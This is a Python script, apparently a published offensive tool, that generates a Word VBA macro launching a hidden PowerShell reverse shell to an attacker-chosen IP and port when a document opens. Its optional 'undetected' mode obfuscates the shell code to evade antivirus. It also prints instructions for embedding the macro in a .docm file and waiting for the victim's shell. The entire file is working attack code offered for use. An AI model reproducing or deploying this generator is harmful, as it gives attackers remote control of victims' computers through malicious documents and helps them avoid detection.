#!/usr/bin/env python3

import sys
import base64
import re
import string
import random

# Very simple rev shell VBA macro generator script 
# By Sagiv \ github.com/sajibuu

def help():
    print("Reverse shell VB Macro generator")
    print("Code by Sagiv\nGithub: https://github.com/sajibuu\n")
    print("For undetected reverse shell:")
    print("USAGE: %s IP PORT --undetected" % sys.argv[0])
    print("\nFor easily detecte reverse shell but suitable for machines:")
    print("USAGE: %s IP PORT" % sys.argv[0])
    exit()


def undetected_reverse_shell(ip, port):
    # Credit to https://github.com/deeexcee-io/PowerShell-Reverse-Shell-Generator
    script = "Start-Process $PSHOME\powershell.exe -ArgumentList {-ep bypass -nop $client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden"

    # Replace all variables with random 10-character names - excluding $PSHOME
    var_dict = {}
    pattern = re.compile(r'(?!\$PSHOME)(\$[A-Za-z0-9]+)')

    def replace_var(match):
        var_name = match.group(1)
        if var_name not in var_dict:
            var_dict[var_name] = f'${"".join(random.choices(string.ascii_letters + string.digits, k=10))}'
        return var_dict[var_name]

    script = pattern.sub(replace_var, script)

    # Replace iex with i''ex
    pattern = re.compile(r'iex')
    script = pattern.sub("i''ex", script)

    # Replace PS with <:Random uuid):>
    pattern = re.compile(r'\bPS\b')

    def replace_ps(match):
        return f'<:{"".join(random.choices(string.ascii_letters + string.digits, k=10))}:>'

    script = pattern.sub(replace_ps, script)

    # Replace IP and port in script
    script = script.replace("'*LHOST*',*LPORT*", f"'{ip}',{port}")

    # Convert IP addresses to hex
    pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')

    def ip_to_hex(match):
        return '0x' + ''.join(f'{int(x):02x}' for x in match.group(0).split('.'))

    script = pattern.sub(ip_to_hex, script)

    # Convert Port Number to hex - Not matching 65535
    pattern = re.compile(r'\b(?!65535)([1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])\b')

    def port_to_hex(match):
            port_number = int(match.group())
            hex_value = hex(port_number)
            return hex_value

    payload = pattern.sub(port_to_hex, script)

    return payload

def detected_reverse_shell(ip, port):
    payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    payload = payload % (ip, port)

    return payload

if __name__ == "__main__":
    undetected = False   

    if len(sys.argv) == 4:
        if "--undetected" in sys.argv:
            undetected = True
            (ip, port) = (sys.argv[1], int(sys.argv[2]))
    elif len(sys.argv) == 3:   
        (ip, port) = (sys.argv[1], int(sys.argv[2]))

    if "-h" in sys.argv or "--help" in sys.argv or len(sys.argv) == 1:
        help()

    if undetected:
        print("\nYou chose undetectable payload!")
        payload = undetected_reverse_shell(ip, port)
    else:
        print("\nYou chose a detectable payload!")
        payload = detected_reverse_shell(ip, port)

    final_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()

    str="powershell.exe -nop -w hidden -e %s" % final_payload
    n=50
    macro = ""
    print("\n-----START OF THE PAYLOAD-----\n")
    macro += "Sub AutoOpen()\n       AutoOpenMacro\nEnd Sub\n\nSub Document_Open()\n       AutoOpenMacro\nEnd Sub\n\nSub AutoOpenMacro()\n      Dim Str As String\n"

    print("Sub AutoOpen()\n       AutoOpenMacro\nEnd Sub\n\nSub Document_Open()\n       AutoOpenMacro\nEnd Sub\n\nSub AutoOpenMacro()\n      Dim Str As String\n")

    for i in range(0,len(str),n):
        print("    Str = str+" + '"' + str[i:i+n] +'"')
        macro += "    Str = str+" + '"' + str[i:i+n] +'"\n' 
    macro += '\n    CreateObject("Wscript.shell").Run Str\nEnd Sub' 
    print('\n    CreateObject("Wscript.shell").Run Str\nEnd Sub')
    print("\n-----END OF THE PAYLOAD-----\n")
    file = open("rev_shell.macro", "w")
    file.write(macro)
    print("Instructions:")
    print("Create a Word document and save it as Word 97-2003 .docm.\nThen, go to \"View\", \"Macro\", and create a macro named AutoOpenMacro, copy the macro script above and save it in the document itself!\nFinally, save the file, open a listener and wait for a reverse shell when the document opens.")
    print("\nMacro saved to rev_shell.macro as well.")
